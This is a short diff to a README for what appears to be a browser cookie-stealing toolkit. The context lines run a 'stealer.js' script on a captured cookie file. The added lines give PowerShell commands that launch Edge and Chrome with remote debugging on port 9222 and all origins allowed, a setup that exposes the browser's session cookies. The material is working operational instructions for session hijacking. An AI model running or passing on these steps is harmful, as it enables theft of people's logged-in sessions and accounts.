@@ -32,3 +32,10 @@ npm install
 cp ~/cookie-remote-debugger/cuddlephish_YYYY-MM-DD_HH-MM-SS.json .
 node stealer.js cuddlephish_YYYY-MM-DD_HH-MM-SS.json
 ```
+
+Note: 
+Edge does not require an alternate data directory, but Chrome does
+```
+start-process msedge.exe -ArgumentList '--remote-debugging-port=9222 --remote-allow-origins=* https://google.com'
+start-process chrome.exe -ArgumentList '--remote-debugging-port=9222 --remote-allow-origins=* --user-data-dir=C:\Users\Public\Documents'
+```
